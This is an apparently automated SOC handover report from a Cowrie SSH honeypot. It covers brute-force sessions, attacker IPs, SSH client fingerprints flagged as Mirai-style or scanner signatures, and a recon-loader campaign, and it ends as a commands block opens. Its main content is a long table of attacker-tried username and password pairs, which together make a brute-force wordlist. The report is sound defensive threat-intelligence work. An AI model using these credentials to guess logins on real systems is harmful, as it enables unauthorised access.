# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-27 |
| **Generated At** | 2026-06-27T13:50:50Z |
| **Shift Time** | 13:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1163** |
| Confirmed Threats | **1149** |
| False Positives Filtered | **14** (1.2%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **10** |
| High Severity Cases | **330** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **833** |
| Malware Samples Analyzed | **5** HIGH · **42** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **336** |
| Unique Credential Pairs | **325** |
| Unique Usernames | **167** |
| Unique Passwords | **273** |
| Successful Auth Pairs | **331** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 127 |
| `ubuntu` | 14 |
| `admin` | 8 |
| `user` | 5 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 27 |
| `admin` | 6 |
| `111111` | 6 |
| `1234` | 4 |
| `passwd` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 5 |
| `root` | `13579-\` | 2 |
| `root` | `kekim` | 2 |
| `admin` | `` | 2 |
| `administrator` | `)(*&^%` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qlalf#wiseit` | `209.99.185.59` | 2026-06-27T08:55:37 |
| `ubuntu` | `hduser1234` | `209.99.185.59` | 2026-06-27T08:56:30 |
| `impala` | `123456` | `209.99.185.59` | 2026-06-27T08:57:26 |
| `dell` | `Dell@2015` | `209.99.185.59` | 2026-06-27T08:58:23 |
| `qtss` | `qtss1234` | `209.99.185.59` | 2026-06-27T08:59:21 |
| `rds` | `rds` | `45.198.224.120` | 2026-06-27T08:59:48 |
| `admin` | `admin` | `223.85.102.135` | 2026-06-27T08:59:53 |
| `www-admin` | `www-admin` | `209.99.185.59` | 2026-06-27T09:00:17 |
| `root` | `5201314` | `209.99.185.59` | 2026-06-27T09:01:11 |
| `root` | `24682468` | `209.99.185.59` | 2026-06-27T09:02:05 |
| `nvidia` | `sugontest` | `209.99.185.59` | 2026-06-27T09:02:59 |
| `yzr` | `yzr123456` | `209.99.185.59` | 2026-06-27T09:03:55 |
| `yjcho` | `1234` | `209.99.185.59` | 2026-06-27T09:04:53 |
| `zhiyuan` | `950708` | `209.99.185.59` | 2026-06-27T09:05:49 |
| `root` | `12345679` | `45.205.1.42` | 2026-06-27T09:05:52 |
| `root` | `xsw0p;/;QAZ` | `209.99.185.59` | 2026-06-27T09:06:46 |
| `oscar` | `oscar` | `209.99.185.59` | 2026-06-27T09:07:45 |
| `root` | `13579-\` | `45.198.224.92` | 2026-06-27T09:08:28 |
| `root` | `PfZvqmO4BD68` | `209.99.185.59` | 2026-06-27T09:08:39 |
| `root` | `13579-\` | `10.0.0.73` | 2026-06-27T09:08:45 |
| `lijinhui` | `zjhimn980305` | `209.99.185.59` | 2026-06-27T09:09:34 |
| `merapi` | `merapi` | `209.99.185.59` | 2026-06-27T09:10:30 |
| `site` | `site` | `45.198.224.120` | 2026-06-27T09:11:08 |
| `tjy` | `tjy123456` | `209.99.185.59` | 2026-06-27T09:11:27 |
| `share` | `share` | `209.99.185.59` | 2026-06-27T09:12:23 |
| `operator` | `operator123` | `209.99.185.59` | 2026-06-27T09:13:18 |
| `dell` | `Admin@2016` | `209.99.185.59` | 2026-06-27T09:14:14 |
| `root` | `abcde12345` | `209.99.185.59` | 2026-06-27T09:15:09 |
| `root` | `123zxc` | `209.99.185.59` | 2026-06-27T09:16:06 |
| `conta4` | `conta4` | `209.99.185.59` | 2026-06-27T09:17:04 |
| `gaoyuan` | `a123456` | `209.99.185.59` | 2026-06-27T09:18:03 |
| `bigdata` | `111111` | `209.99.185.59` | 2026-06-27T09:19:02 |
| `wfst` | `P@ss#p0rt` | `209.99.185.59` | 2026-06-27T09:20:00 |
| `ubuntu` | `deploy12345678` | `45.205.1.42` | 2026-06-27T09:20:30 |
| `ict` | `123456` | `209.99.185.59` | 2026-06-27T09:20:58 |
| `testuser` | `1234qwer` | `209.99.185.59` | 2026-06-27T09:21:56 |
| `root` | `qwe123..` | `45.198.224.120` | 2026-06-27T09:22:19 |
| `angel` | `angel1` | `209.99.185.59` | 2026-06-27T09:22:56 |
| `root` | `!@#59560955` | `209.99.185.59` | 2026-06-27T09:23:57 |
| `wpyan` | `123456` | `209.99.185.59` | 2026-06-27T09:24:57 |
| `root` | `kekim` | `45.198.224.92` | 2026-06-27T09:26:04 |
| `root` | `kekim` | `10.0.0.73` | 2026-06-27T09:26:12 |
| `vip` | `vip` | `209.99.185.59` | 2026-06-27T09:26:57 |
| `user` | `pass123456` | `209.99.185.59` | 2026-06-27T09:27:56 |
| `web` | `w3b` | `209.99.185.59` | 2026-06-27T09:28:54 |
| `salav1` | `salav1` | `209.99.185.59` | 2026-06-27T09:29:54 |
| `cailianhua` | `qwe123` | `209.99.185.59` | 2026-06-27T09:30:58 |
| `caja0` | `caja0` | `209.99.185.59` | 2026-06-27T09:32:00 |
| `root` | `1qaz2wsx#EDC` | `209.99.185.59` | 2026-06-27T09:32:59 |
| `jiahui` | `jiahui` | `45.198.224.120` | 2026-06-27T09:33:18 |
| `root` | `zxc123!@` | `209.99.185.59` | 2026-06-27T09:34:00 |
| `root` | `QAZwsxedc123` | `45.205.1.42` | 2026-06-27T09:35:03 |
| `pul` | `qwer1234` | `209.99.185.59` | 2026-06-27T09:35:04 |
| `apc` | `aipengcheng` | `209.99.185.59` | 2026-06-27T09:36:09 |
| `wuweiwen` | `wuweiwen` | `209.99.185.59` | 2026-06-27T09:37:14 |
| `root` | `Pass@word123$` | `209.99.185.59` | 2026-06-27T09:38:18 |
| `tibero7` | `tibero7` | `209.99.185.59` | 2026-06-27T09:39:22 |
| `chenchao` | `chenchao` | `209.99.185.59` | 2026-06-27T09:40:30 |
| `root` | `7777` | `209.99.185.59` | 2026-06-27T09:41:36 |
| `yangboyi` | `123456` | `209.99.185.59` | 2026-06-27T09:42:41 |
| `administrator` | `)(*&^%` | `45.198.224.92` | 2026-06-27T09:43:34 |
| `lin` | `123456` | `209.99.185.59` | 2026-06-27T09:43:45 |
| `administrator` | `)(*&^%` | `10.0.0.73` | 2026-06-27T09:43:47 |
| `adm` | `password` | `45.198.224.120` | 2026-06-27T09:44:29 |
| `user1` | `12qwaszx` | `209.99.185.59` | 2026-06-27T09:44:49 |
| `wms21` | `WMs01205571` | `209.99.185.59` | 2026-06-27T09:45:51 |
| `dasan` | `123456qwer!` | `209.99.185.59` | 2026-06-27T09:46:56 |
| `root` | `abc1234567` | `209.99.185.59` | 2026-06-27T09:48:03 |
| `ceo` | `123456` | `209.99.185.59` | 2026-06-27T09:49:11 |
| `root` | `football` | `45.205.1.42` | 2026-06-27T09:49:26 |
| `camille` | `camille` | `209.99.185.59` | 2026-06-27T09:50:18 |
| `user` | `666666` | `209.99.185.59` | 2026-06-27T09:51:24 |
| `root` | `1qazxcv` | `209.99.185.59` | 2026-06-27T09:52:31 |
| `yoo` | `123456` | `209.99.185.59` | 2026-06-27T09:53:36 |
| `deployer` | `deployer123` | `209.99.185.59` | 2026-06-27T09:54:40 |
| `joshua` | `joshua` | `209.99.185.59` | 2026-06-27T09:55:47 |
| `ubuntu` | `qwerty1234567890` | `45.198.224.120` | 2026-06-27T09:56:00 |
| `root` | `a13a13` | `209.99.185.59` | 2026-06-27T09:56:57 |
| `root` | `admin1234` | `209.99.185.59` | 2026-06-27T09:58:03 |
| `root` | `testtest` | `209.99.185.59` | 2026-06-27T09:59:08 |
| `potok` | `666666` | `209.99.185.59` | 2026-06-27T10:00:18 |
| `deploy` | `passwd` | `209.99.185.59` | 2026-06-27T10:01:04 |
| `Soyoun` | `korea2011` | `209.99.185.59` | 2026-06-27T10:01:53 |
| `ubuntu` | `root123` | `209.99.185.59` | 2026-06-27T10:02:39 |
| `x2goprint` | `x2goprint` | `209.99.185.59` | 2026-06-27T10:03:23 |
| `root` | `.rhosts` | `45.205.1.42` | 2026-06-27T10:03:59 |
| `root` | `qwert123456789` | `209.99.185.59` | 2026-06-27T10:04:07 |
| `manju` | `manju` | `209.99.185.59` | 2026-06-27T10:04:52 |
| `qiuying` | `qiuying` | `209.99.185.59` | 2026-06-27T10:05:39 |
| `root` | `password1` | `209.99.185.59` | 2026-06-27T10:06:25 |
| `Data` | `korea2020` | `209.99.185.59` | 2026-06-27T10:07:10 |
| `boris` | `boris` | `45.198.224.120` | 2026-06-27T10:07:11 |
| `yuanwd` | `test123` | `209.99.185.59` | 2026-06-27T10:07:59 |
| `hsj` | `korea2010` | `209.99.185.59` | 2026-06-27T10:08:51 |
| `server` | `server` | `209.99.185.59` | 2026-06-27T10:09:37 |
| `root` | `@theLokcalID#` | `209.99.185.59` | 2026-06-27T10:10:25 |
| `lyp` | `lyp` | `209.99.185.59` | 2026-06-27T10:11:12 |
| `zjw` | `zjw` | `209.99.185.59` | 2026-06-27T10:12:01 |
| `root` | `User@123` | `209.99.185.59` | 2026-06-27T10:12:53 |
| `root` | `keeper` | `209.99.185.59` | 2026-06-27T10:13:50 |
| `zouzhenhong` | `cluster.208008@adept` | `209.99.185.59` | 2026-06-27T10:14:43 |
| `bdp` | `bdp` | `209.99.185.59` | 2026-06-27T10:15:35 |
| `root` | `exit` | `209.99.185.59` | 2026-06-27T10:16:24 |
| `daniel` | `daniel` | `209.99.185.59` | 2026-06-27T10:17:11 |
| `root` | `demo12` | `209.99.185.59` | 2026-06-27T10:17:56 |
| `ginger` | `ginger` | `45.198.224.120` | 2026-06-27T10:17:59 |
| `root` | `QAZ!@#123` | `45.205.1.42` | 2026-06-27T10:18:27 |
| `testuser` | `qwerty123` | `209.99.185.59` | 2026-06-27T10:18:44 |
| `root` | `acer` | `209.99.185.59` | 2026-06-27T10:19:36 |
| `louis` | `123456` | `209.99.185.59` | 2026-06-27T10:20:28 |
| `xiehui` | `xiehui` | `209.99.185.59` | 2026-06-27T10:21:18 |
| `lishenghao` | `123456` | `209.99.185.59` | 2026-06-27T10:22:07 |
| `root` | `admin001` | `209.99.185.59` | 2026-06-27T10:22:55 |
| `smabriel` | `smabriel` | `209.99.185.59` | 2026-06-27T10:23:43 |
| `posco` | `posco` | `209.99.185.59` | 2026-06-27T10:24:30 |
| `ziqi` | `ziqi` | `209.99.185.59` | 2026-06-27T10:25:19 |
| `guest` | `passwd` | `209.99.185.59` | 2026-06-27T10:26:08 |
| `zkk` | `123456` | `209.99.185.59` | 2026-06-27T10:26:58 |
| `orion` | `orion` | `209.99.185.59` | 2026-06-27T10:27:49 |
| `root` | `qazwsx1` | `209.99.185.59` | 2026-06-27T10:28:40 |
| `amanda` | `amanda` | `45.198.224.120` | 2026-06-27T10:28:43 |
| `testuser` | `password123` | `209.99.185.59` | 2026-06-27T10:29:29 |
| `test1` | `123` | `209.99.185.59` | 2026-06-27T10:30:19 |
| `davids` | `davids` | `209.99.185.59` | 2026-06-27T10:31:12 |
| `wanghao` | `111111` | `209.99.185.59` | 2026-06-27T10:32:18 |
| `root` | `qaz123123` | `45.205.1.42` | 2026-06-27T10:32:48 |
| `lz` | `123456` | `209.99.185.59` | 2026-06-27T10:33:11 |
| `wty` | `123456` | `209.99.185.59` | 2026-06-27T10:34:01 |
| `ubuntu` | `1qsx2waz` | `209.99.185.59` | 2026-06-27T10:34:53 |
| `mike0295` | `1` | `209.99.185.59` | 2026-06-27T10:35:45 |
| `Admin` | `Admin123` | `209.99.185.59` | 2026-06-27T10:36:35 |
| `root` | `77` | `209.99.185.59` | 2026-06-27T10:37:25 |
| `root` | `bgt3edc$RFV5` | `209.99.185.59` | 2026-06-27T10:38:16 |
| `root` | `Dell1234` | `209.99.185.59` | 2026-06-27T10:39:07 |
| `root` | `pwlamea` | `45.198.224.120` | 2026-06-27T10:39:14 |
| `ictmcg` | `ictmcg2022` | `209.99.185.59` | 2026-06-27T10:40:00 |
| `diego` | `diego` | `209.99.185.59` | 2026-06-27T10:40:52 |
| `lbh` | `123456` | `209.99.185.59` | 2026-06-27T10:41:44 |
| `xjbw` | `123456` | `209.99.185.59` | 2026-06-27T10:42:39 |
| `ubuntu` | `passworded` | `209.99.185.59` | 2026-06-27T10:43:31 |
| `admin1` | `1qaz@WSX` | `209.99.185.59` | 2026-06-27T10:44:23 |
| `user` | `1q2w3e4r` | `209.99.185.59` | 2026-06-27T10:45:14 |
| `new` | `new` | `45.148.10.239` | 2026-06-27T10:45:29 |
| `iexcel_qingdao` | `iexcel_qingdao` | `209.99.185.59` | 2026-06-27T10:46:08 |
| `user123` | `user123` | `209.99.185.59` | 2026-06-27T10:47:04 |
| `ubuntu` | `debian12` | `45.205.1.42` | 2026-06-27T10:47:15 |
| `pristine` | `xz965247` | `209.99.185.59` | 2026-06-27T10:47:57 |
| `root` | `,vd0b.2e,b02` | `209.99.185.59` | 2026-06-27T10:48:49 |
| `sisi` | `sisi` | `209.99.185.59` | 2026-06-27T10:49:41 |
| `root` | `Root@12345` | `45.198.224.120` | 2026-06-27T10:49:56 |
| `dingy` | `111111` | `209.99.185.59` | 2026-06-27T10:50:33 |
| `zhangjinzhao` | `linka84521` | `209.99.185.59` | 2026-06-27T10:51:27 |
| `root` | `sony` | `209.99.185.59` | 2026-06-27T10:52:25 |
| `root` | `oracol` | `209.99.185.59` | 2026-06-27T10:53:20 |
| `app` | `password` | `209.99.185.59` | 2026-06-27T10:54:14 |
| `sungd` | `123456` | `209.99.185.59` | 2026-06-27T10:55:08 |
| `admin` | `admin` | `118.26.111.107` | 2026-06-27T10:55:40 |
| `admin` | `admin` | `130.12.180.51` | 2026-06-27T10:55:41 |
| `server` | `q1w2e3r4` | `209.99.185.59` | 2026-06-27T10:56:04 |
| `root` | `qsQq/3Mx` | `209.99.185.59` | 2026-06-27T10:56:59 |
| `ubuntu` | `PASSW0RD` | `209.99.185.59` | 2026-06-27T10:57:53 |
| `root` | `!Z@X3c4v` | `209.99.185.59` | 2026-06-27T10:58:46 |
| `root` | `qwerty12` | `209.99.185.59` | 2026-06-27T10:59:41 |
| `abonent1` | `abonent1` | `209.99.185.59` | 2026-06-27T11:00:35 |
| `root` | `Qwer12345` | `45.198.224.120` | 2026-06-27T11:00:54 |
| `bigdata` | `123456` | `209.99.185.59` | 2026-06-27T11:01:29 |
| `root` | `QAZWSXEDC` | `45.205.1.42` | 2026-06-27T11:01:37 |
| `abms` | `123$%^` | `209.99.185.59` | 2026-06-27T11:02:22 |
| `hadoop` | `test321` | `209.99.185.59` | 2026-06-27T11:03:19 |
| `root` | `qnals123!` | `209.99.185.59` | 2026-06-27T11:04:14 |
| `root` | `mnbv` | `209.99.185.59` | 2026-06-27T11:05:10 |
| `root` | `docker` | `209.99.185.59` | 2026-06-27T11:06:07 |
| `hxh` | `blabla123x!!!` | `209.99.185.59` | 2026-06-27T11:07:03 |
| `root` | `hunter` | `209.99.185.59` | 2026-06-27T11:07:59 |
| `root` | `asddsa` | `209.99.185.59` | 2026-06-27T11:08:50 |
| `ps` | `Abc@2022` | `209.99.185.59` | 2026-06-27T11:09:44 |
| `root` | `AjERiAne@ASDFR#%` | `209.99.185.59` | 2026-06-27T11:10:36 |
| `root` | `cloud1234` | `209.99.185.59` | 2026-06-27T11:11:29 |
| `root` | `toortoor` | `45.198.224.120` | 2026-06-27T11:12:03 |
| `swki` | `1234` | `209.99.185.59` | 2026-06-27T11:12:22 |
| `root` | `upload` | `209.99.185.59` | 2026-06-27T11:13:16 |
| `deployer` | `changeme` | `209.99.185.59` | 2026-06-27T11:14:12 |
| `root` | `P@ssw0rd2018` | `209.99.185.59` | 2026-06-27T11:15:03 |
| `deploy` | `654321` | `209.99.185.59` | 2026-06-27T11:15:55 |
| `root` | `PaSsW0Rd` | `45.205.1.42` | 2026-06-27T11:15:57 |
| `root` | `0okm9ijn` | `209.99.185.59` | 2026-06-27T11:16:48 |
| `root` | `45179aA!` | `209.99.185.59` | 2026-06-27T11:17:45 |
| `user` | `1qaz2wsx` | `209.99.185.59` | 2026-06-27T11:18:43 |
| `sigdev` | `sigdev` | `209.99.185.59` | 2026-06-27T11:19:40 |
| `root` | `zhouping` | `209.99.185.59` | 2026-06-27T11:20:39 |
| `liucongying` | `liucongying` | `209.99.185.59` | 2026-06-27T11:21:34 |
| `yangbo` | `123456` | `209.99.185.59` | 2026-06-27T11:22:29 |
| `test` | `123456` | `45.198.224.120` | 2026-06-27T11:22:48 |
| `dvr` | `123456` | `209.99.185.59` | 2026-06-27T11:23:25 |
| `root` | `p0o9i8u7y6t5` | `209.99.185.59` | 2026-06-27T11:24:24 |
| `test` | `12wqasxz` | `209.99.185.59` | 2026-06-27T11:25:20 |
| `server` | `qwerty123456` | `209.99.185.59` | 2026-06-27T11:26:18 |
| `root` | `Temp123` | `209.99.185.59` | 2026-06-27T11:27:16 |
| `dell` | `dell@0000` | `209.99.185.59` | 2026-06-27T11:28:17 |
| `postgres` | `QwErTy` | `209.99.185.59` | 2026-06-27T11:29:22 |
| `root` | `q1w2e3r4` | `209.99.185.59` | 2026-06-27T11:30:20 |
| `test` | `root` | `45.205.1.42` | 2026-06-27T11:30:28 |
| `ansible` | `1qaz@WSX` | `209.99.185.59` | 2026-06-27T11:31:23 |
| `etl` | `etl123` | `209.99.185.59` | 2026-06-27T11:32:23 |
| `testing` | `123qwe` | `209.99.185.59` | 2026-06-27T11:33:22 |
| `vnc` | `vnc` | `45.198.224.120` | 2026-06-27T11:33:58 |
| `bitrix` | `bitrix123` | `209.99.185.59` | 2026-06-27T11:34:25 |
| `user` | `123456789` | `209.99.185.59` | 2026-06-27T11:35:27 |
| `fx` | `fx` | `209.99.185.59` | 2026-06-27T11:36:30 |
| `pos` | `123456` | `209.99.185.59` | 2026-06-27T11:37:31 |
| `machao` | `123456` | `209.99.185.59` | 2026-06-27T11:38:31 |
| `root` | `pula` | `209.99.185.59` | 2026-06-27T11:39:29 |
| `root` | `spectrum` | `209.99.185.59` | 2026-06-27T11:40:27 |
| `root` | `bjMcJ1xDdI86` | `209.99.185.59` | 2026-06-27T11:41:29 |
| `se` | `se` | `209.99.185.59` | 2026-06-27T11:42:29 |
| `admin` | `qwer1234` | `209.99.185.59` | 2026-06-27T11:43:31 |
| `mysql` | `111111` | `209.99.185.59` | 2026-06-27T11:44:33 |
| `root` | `maggie` | `45.198.224.120` | 2026-06-27T11:44:59 |
| `root` | `teste` | `45.205.1.42` | 2026-06-27T11:45:06 |
| `angel` | `222222` | `209.99.185.59` | 2026-06-27T11:45:33 |
| `root` | `@#$%12345` | `209.99.185.59` | 2026-06-27T11:46:33 |
| `michael` | `michael` | `209.99.185.59` | 2026-06-27T11:47:33 |
| `test1` | `asj2j21OK11!` | `209.99.185.59` | 2026-06-27T11:48:37 |
| `cs20-zhouxy` | `zxy123` | `209.99.185.59` | 2026-06-27T11:49:40 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-27T11:50:29 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-27T11:50:30 |
| `jenkins` | `123456` | `209.99.185.59` | 2026-06-27T11:50:44 |
| `root` | `Root@1234` | `209.99.185.59` | 2026-06-27T11:51:50 |
| `vps` | `pass1234` | `209.99.185.59` | 2026-06-27T11:52:56 |
| `kettle` | `kettle` | `209.99.185.59` | 2026-06-27T11:53:58 |
| `ubuntu` | `hduser123` | `209.99.185.59` | 2026-06-27T11:55:00 |
| `test` | `testtest` | `209.99.185.59` | 2026-06-27T11:56:07 |
| `root` | `l3tm31n` | `45.198.224.120` | 2026-06-27T11:56:07 |
| `root` | `lkjhgfdsa` | `209.99.185.59` | 2026-06-27T11:57:17 |
| `root` | `!root` | `91.92.40.13` | 2026-06-27T11:57:47 |
| `zhangsan` | `333333` | `209.99.185.59` | 2026-06-27T11:58:21 |
| `base` | `base` | `209.99.185.59` | 2026-06-27T11:59:23 |
| `root` | `111111` | `91.92.40.13` | 2026-06-27T11:59:35 |
| `oracle` | `azerty` | `45.205.1.42` | 2026-06-27T11:59:41 |
| `chuantan` | `bjtu618253` | `209.99.185.59` | 2026-06-27T12:00:22 |
| `root` | `wldj@2019_!@#` | `209.99.185.59` | 2026-06-27T12:01:10 |
| `root` | `123123` | `91.92.40.13` | 2026-06-27T12:01:28 |
| `esuser` | `123456` | `209.99.185.59` | 2026-06-27T12:02:02 |
| `ubuntu` | `oracle12345` | `209.99.185.59` | 2026-06-27T12:03:11 |
| `root` | `1234` | `91.92.40.13` | 2026-06-27T12:03:16 |
| `ubuntu` | `P@55w0rd` | `209.99.185.59` | 2026-06-27T12:04:07 |
| `postgres` | `postgres1234` | `209.99.185.59` | 2026-06-27T12:04:53 |
| `root` | `12345` | `91.92.40.13` | 2026-06-27T12:05:09 |
| `root` | `Qidi@2352@#%@` | `209.99.185.59` | 2026-06-27T12:05:38 |
| `oraClient` | `oraClient` | `209.99.185.59` | 2026-06-27T12:06:24 |
| `debian` | `1qaz@WSX` | `209.99.185.59` | 2026-06-27T12:07:13 |
| `root` | `QAZ@WSX` | `45.198.224.120` | 2026-06-27T12:07:33 |
| `yxlu` | `yxlu` | `209.99.185.59` | 2026-06-27T12:07:59 |
| `op` | `op` | `209.99.185.59` | 2026-06-27T12:08:48 |
| `root` | `12345678` | `91.92.40.13` | 2026-06-27T12:08:52 |
| `hisense` | `123456` | `209.99.185.59` | 2026-06-27T12:09:39 |
| `ubuntu` | `ubuntu@2024!` | `209.99.185.59` | 2026-06-27T12:10:25 |
| `root` | `123456789` | `91.92.40.13` | 2026-06-27T12:10:43 |
| `andy` | `andy` | `209.99.185.59` | 2026-06-27T12:11:12 |
| `root` | `federica` | `209.99.185.59` | 2026-06-27T12:11:59 |
| `root` | `P@ssw0rd` | `91.92.40.13` | 2026-06-27T12:12:42 |
| `root` | `P30p!%^3s6891` | `209.99.185.59` | 2026-06-27T12:12:45 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-27T12:13:33 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-27T12:13:35 |
| `root` | `abcdpass123` | `209.99.185.59` | 2026-06-27T12:13:37 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-27T12:13:37 |
| `root` | `zaq12wsx` | `45.205.1.42` | 2026-06-27T12:14:16 |
| `root` | `555555` | `209.99.185.59` | 2026-06-27T12:14:24 |
| `root` | `Password1` | `91.92.40.13` | 2026-06-27T12:14:50 |
| `lifei` | `1EOLzIAMnX` | `209.99.185.59` | 2026-06-27T12:15:11 |
| `sunfei` | `sunfei` | `209.99.185.59` | 2026-06-27T12:15:59 |
| `node` | `123qwe` | `209.99.185.59` | 2026-06-27T12:16:49 |
| `root` | `Root123` | `91.92.40.13` | 2026-06-27T12:17:24 |
| `airchem` | `korea2021` | `209.99.185.59` | 2026-06-27T12:17:37 |
| `root` | `qwertuiop` | `209.99.185.59` | 2026-06-27T12:18:27 |
| `root` | `undefined` | `45.198.224.120` | 2026-06-27T12:18:41 |
| `root` | `Abcd1234!` | `209.99.185.59` | 2026-06-27T12:19:19 |
| `zzy` | `123456` | `209.99.185.59` | 2026-06-27T12:20:07 |
| `root` | `admin` | `91.92.40.13` | 2026-06-27T12:20:31 |
| `root` | `baidu.com` | `209.99.185.59` | 2026-06-27T12:20:58 |
| `djh23` | `dingjh.1121` | `209.99.185.59` | 2026-06-27T12:21:54 |
| `deployer` | `1234` | `209.99.185.59` | 2026-06-27T12:22:45 |
| `apache` | `passwd` | `209.99.185.59` | 2026-06-27T12:23:36 |
| `root` | `admin123` | `91.92.40.13` | 2026-06-27T12:24:29 |
| `904abc` | `904abc` | `209.99.185.59` | 2026-06-27T12:24:30 |
| `es` | `1234567` | `209.99.185.59` | 2026-06-27T12:25:18 |
| `gitlab` | `123qwe` | `209.99.185.59` | 2026-06-27T12:26:06 |
| `root` | `kojak` | `209.99.185.59` | 2026-06-27T12:26:55 |
| `null` | `sd.30df.1s,m1ba*IK<abmuiemaL4` | `209.99.185.59` | 2026-06-27T12:27:45 |
| `msf` | `msf` | `209.99.185.59` | 2026-06-27T12:28:35 |
| `root` | `123321` | `45.205.1.42` | 2026-06-27T12:28:54 |
| `tester` | `changeme123` | `209.99.185.59` | 2026-06-27T12:29:25 |
| `root` | `alpine` | `91.92.40.13` | 2026-06-27T12:29:32 |
| `root` | `speak` | `45.198.224.120` | 2026-06-27T12:29:55 |
| `root` | `98xw.com` | `209.99.185.59` | 2026-06-27T12:30:14 |
| `fort` | `fort` | `209.99.185.59` | 2026-06-27T12:31:00 |
| `buero3` | `buero31` | `209.99.185.59` | 2026-06-27T12:31:46 |
| `root` | `dell` | `209.99.185.59` | 2026-06-27T12:32:33 |
| `machine` | `machine` | `209.99.185.59` | 2026-06-27T12:33:21 |
| `root` | `Qwe123!!` | `209.99.185.59` | 2026-06-27T12:34:10 |
| `jychoi` | `jychoi` | `209.99.185.59` | 2026-06-27T12:35:00 |
| `root` | `changeme` | `91.92.40.13` | 2026-06-27T12:35:41 |
| `rootroot` | `111111` | `209.99.185.59` | 2026-06-27T12:35:49 |
| `root` | `1qaz!QAZ` | `209.99.185.59` | 2026-06-27T12:36:38 |
| `root` | `Pass1234567` | `209.99.185.59` | 2026-06-27T12:37:30 |
| `root` | `146.56.242.137` | `209.99.185.59` | 2026-06-27T12:38:18 |
| `root` | `root@777` | `209.99.185.59` | 2026-06-27T12:39:06 |
| `root` | `1qaz` | `209.99.185.59` | 2026-06-27T12:39:54 |
| `developer` | `abc123` | `209.99.185.59` | 2026-06-27T12:40:43 |
| `root` | `P@ssw0rd3` | `45.198.224.120` | 2026-06-27T12:41:21 |
| `tester` | `abc123` | `209.99.185.59` | 2026-06-27T12:41:32 |
| `ubuntu` | `developer123` | `209.99.185.59` | 2026-06-27T12:42:25 |
| `root` | `default` | `91.92.40.13` | 2026-06-27T12:43:07 |
| `root` | `Amax1979!` | `209.99.185.59` | 2026-06-27T12:43:19 |
| `root` | `1312` | `45.205.1.42` | 2026-06-27T12:43:26 |
| `bit` | `7890uiop` | `209.99.185.59` | 2026-06-27T12:44:10 |
| `santiago` | `santiago` | `209.99.185.59` | 2026-06-27T12:45:04 |
| `ubuntu` | `00000000` | `209.99.185.59` | 2026-06-27T12:45:58 |
| `tomcat` | `qweasdzxc` | `209.99.185.59` | 2026-06-27T12:46:51 |
| `fengshuai` | `fengshuai` | `209.99.185.59` | 2026-06-27T12:47:51 |
| `ttli` | `ttli` | `209.99.185.59` | 2026-06-27T12:48:48 |
| `potok` | `222222` | `209.99.185.59` | 2026-06-27T12:49:41 |
| `root` | `letmein` | `91.92.40.13` | 2026-06-27T12:50:06 |
| `sunzheng` | `sunzheng` | `209.99.185.59` | 2026-06-27T12:50:32 |
| `localadmin` | `changeme` | `209.99.185.59` | 2026-06-27T12:51:24 |
| `sshd` | `v.2-vv91.va2l1` | `209.99.185.59` | 2026-06-27T12:52:16 |
| `root` | `descan` | `45.198.224.120` | 2026-06-27T12:52:54 |
| `nagios` | `qwe123` | `209.99.185.59` | 2026-06-27T12:53:10 |
| `admin` | `admin` | `43.110.37.217` | 2026-06-27T12:53:40 |
| `zxw` | `zxw` | `209.99.185.59` | 2026-06-27T12:54:04 |
| `cyx` | `123456` | `209.99.185.59` | 2026-06-27T12:54:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1163** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 328 |
| libssh | 15 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 303 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 17 | 1 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 303 | 5 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 17 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 13 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **MEDIUM** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 16 | 1 | `T1082, T1592, T1078, T1083` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
